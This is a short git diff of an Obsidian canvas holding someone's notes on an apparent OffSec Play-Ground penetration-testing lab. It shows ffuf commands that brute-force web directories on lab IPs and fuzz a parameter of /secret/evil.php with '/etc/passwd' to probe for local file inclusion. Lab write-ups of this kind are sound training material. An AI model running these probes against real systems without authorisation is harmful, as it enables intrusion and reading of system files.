@@ -9,7 +9,7 @@
 		{"id":"911a7120c80d2d51","type":"text","text":"ffuf -c -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt:FUZZ -u http://192.168.107.249:33414/FUZZ -e .txt,.html,.php,.bak -recursion -recursion-depth 2 -ic -fc 404\n","x":195,"y":-1315,"width":250,"height":275},
 		{"id":"d8be687ba62b4730","type":"file","file":"Offsec  Play-Ground/media/Pasted image 20260729163034.png","x":1000,"y":-540,"width":428,"height":481},
 		{"id":"b55c566fb5741f51","type":"file","file":"Offsec  Play-Ground/media/Pasted image 20260729164542.png","x":1214,"y":533,"width":568,"height":247},
-		{"id":"b068aef8da9c31da","type":"text","text":"ffuf -c -u 'http://192.168.132.212/secret/evil.php?FUZZ=/etc/passwd' -w /usr/share/seclists/Discovery/Web-Content/web-all-content-types.txt -fs 0\n","x":30,"y":-900,"width":250,"height":260},
+		{"id":"b068aef8da9c31da","type":"text","text":"```\nffuf -c -u 'http://192.168.132.212/secret/evil.php?FUZZ=/etc/passwd' -w /usr/share/seclists/Discovery/Web-Content/web-all-content-types.txt -fs 0\n```","x":30,"y":-900,"width":250,"height":260},
 		{"id":"482c599b0ef9f8b9","type":"text","text":"```\nAfter ffuf i found out /secret/\nlater on doing ffuf i found out there was /evil.php\n```","x":1674,"y":-357,"width":365,"height":117},
 		{"id":"0912b98dde6d915a","type":"file","file":"Offsec  Play-Ground/media/Pasted image 20260729163332.png","x":1900,"y":-48,"width":638,"height":276},
 		{"id":"37091a0e44a9ab70","type":"file","file":"Offsec  Play-Ground/media/Pasted image 20260729163641.png","x":1935,"y":500,"width":568,"height":560},
